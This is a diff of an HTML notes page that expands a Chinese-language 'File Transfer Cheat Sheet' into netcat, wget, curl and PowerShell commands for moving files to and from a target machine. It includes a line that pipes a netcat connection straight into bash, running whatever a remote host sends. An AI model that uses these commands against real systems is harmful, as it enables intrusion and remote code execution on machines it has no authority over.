@@ -181,11 +181,25 @@ function sidebar_toggle() {
         </div>
         <div class="book-content">
           <div class="book-post">
-  <h1 id="文件传输">文件传输</h1>
-<h4 id="NC">NC</h4>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> <span class="token variable">$&#123;file&#125;</span><span class="token operator">|</span><span class="token function">nc</span> <span class="token function">ip</span> port</code></pre>
-<h4 id="Powershell">Powershell</h4>
+  <h1 id="File-Transfer-Cheat-Sheet">File Transfer Cheat Sheet</h1>
+<h2 id="0x01-通用">0x01 通用</h2>
+<h3 id="NC">NC</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 本地</span>
+<span class="token function">cat</span> <span class="token variable">$&#123;file&#125;</span><span class="token operator">|</span><span class="token function">nc</span> -lnvp port
+<span class="token comment"># 目标机</span>
+<span class="token function">nc</span> <span class="token function">ip</span> port <span class="token operator">>></span> <span class="token variable">$&#123;file&#125;</span>
+<span class="token comment"># 执行 bash 的话</span>
+<span class="token function">nc</span> <span class="token function">ip</span> port <span class="token operator">|</span> <span class="token function">bash</span></code></pre>
+<h2 id="0x02-Linux">0x02 Linux</h2>
+<h3 id="Wget">Wget</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://domain/file</code></pre>
+<h3 id="Curl">Curl</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://domain/file -o <span class="token function">file</span></code></pre>
+<h2 id="0x03-Windows">0x03 Windows</h2>
+<h3 id="Wget-v2">Wget</h3>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> -Uri http://domain/file -OutFile <span class="token function">file</span></code></pre>
+<h3 id="Powershell">Powershell</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash">powershell <span class="token punctuation">..</span>.</code></pre>
 </div>
 
 
